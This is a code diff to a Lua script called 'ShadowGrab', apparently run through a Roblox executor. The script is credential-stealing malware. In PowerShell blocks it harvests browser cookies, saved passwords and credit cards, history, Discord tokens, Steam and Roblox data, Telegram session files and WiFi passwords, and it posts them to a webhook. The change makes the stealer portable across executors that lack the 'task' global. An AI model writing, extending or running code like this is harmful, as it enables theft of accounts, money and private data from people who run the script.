@@ -78,6 +78,25 @@ local function RunPS(s)
     return r
 end
 
+-- safe task wrapper (some executors lack `task` global)
+local function taskSpawn(fn)
+    if task and task.spawn then
+        task.spawn(fn)
+    elseif coroutine then
+        coroutine.wrap(fn)()
+    else
+        spawn(fn)
+    end
+end
+
+local function taskWait(s)
+    if task and task.wait then
+        task.wait(s)
+    else
+        wait(s)
+    end
+end
+
 -- Test webhook first
 if not HttpPost(WEBHOOK, JSON({content="🚀 ShadowGrab started"})) then
     warn("SG: HTTP not available")
@@ -85,7 +104,7 @@ if not HttpPost(WEBHOOK, JSON({content="🚀 ShadowGrab started"})) then
 end
 
 -- System info
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         $u=$env:USERNAME; $c=$env:COMPUTERNAME
         $os=(Get-CimInstance Win32_OperatingSystem).Caption
@@ -100,10 +119,10 @@ task.spawn(function()
     if r and r ~= "" then Send(r, "🖥️ System") end
 end)
 
-task.wait(1)
+taskWait(1)
 
 -- Browser cookies (Chrome, Edge, Brave)
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         Add-Type -AssemblyName System.Security
         $r=@()
@@ -159,7 +178,7 @@ task.spawn(function()
 end)
 
 -- Passwords
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         Add-Type -AssemblyName System.Security
         $r=@()
@@ -200,7 +219,7 @@ task.spawn(function()
 end)
 
 -- Credit cards
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         Add-Type -AssemblyName System.Security
         $r=@()
@@ -241,7 +260,7 @@ task.spawn(function()
 end)
 
 -- History
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         $r=@()
         $b=@(
@@ -271,10 +290,10 @@ task.spawn(function()
     if r and r ~= "" then Send(r, "🌐 History (Top 30)") end
 end)
 
-task.wait(3)
+taskWait(3)
 
 -- Discord tokens (leveldb)
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         $r=@()
         $p=@(
@@ -306,7 +325,7 @@ task.spawn(function()
 end)
 
 -- Steam
-task.spawn(function()
+taskSpawn(function()
     local paths = {"C:\\Program Files (x86)\\Steam","C:\\Program Files\\Steam"}
     local sp
     for _,p in ipairs(paths) do if FE(p) then sp=p break end end
@@ -334,7 +353,7 @@ task.spawn(function()
 end)
 
 -- Roblox cookie from file
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         $r=@()
         $p=@("$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat","$env:APPDATA\Roblox\RobloxCookies.dat")
@@ -357,7 +376,7 @@ task.spawn(function()
 end)
 
 -- Telegram
-task.spawn(function()
+taskSpawn(function()
     local p = APPDATA.."\\Telegram Desktop\\tdata"
     if not FE(p) then return end
     local ps = 'Get-ChildItem "'..p..'" -Recurse -File -ErrorAction SilentlyContinue | Where-Object{$_.Length -lt 1MB} | ForEach-Object{Copy-Item $_.FullName "'..TEMP..'\\sg_tg_"+$_.Name -Force}'
@@ -373,7 +392,7 @@ task.spawn(function()
 end)
 
 -- WiFi passwords
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         $r=@()
         $pr=(netsh wlan show profiles) 2>$null | Select-String "All User Profile" | ForEach-Object{$_.ToString().Split(":")[1].Trim()}
@@ -390,7 +409,7 @@ task.spawn(function()
 end)
 
 -- Recent files
-task.spawn(function()
+taskSpawn(function()
     local ps = [[
         $r=@()
         $p="$env:APPDATA\Microsoft\Windows\Recent"
@@ -405,5 +424,5 @@ task.spawn(function()
     if r and r ~= "" then Send(r, "📂 Recent") end
 end)
 
-task.wait(2)
+taskWait(2)
 HttpPost(WEBHOOK, JSON({content="✅ ShadowGrab done"}))
